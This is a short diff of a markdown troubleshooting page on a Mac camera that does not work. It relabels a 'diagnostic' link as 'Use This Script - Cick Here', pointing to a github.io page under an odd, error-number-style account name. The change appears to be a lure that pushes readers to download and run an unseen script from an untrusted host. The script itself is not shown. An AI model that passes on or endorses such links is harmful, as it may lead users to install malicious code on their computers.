@@ -6,7 +6,7 @@
 
 ## Camera Not Working Mac — AVFoundation Capture Pipeline, TCC Database, and IOVideo Driver Failures
 
-> **[Full ISP driver and AVFoundation camera diagnostic](https://error-number-472173.github.io/.github/mac-camera-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-camera-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Camera Not Working, in order of architectural impact:**
 
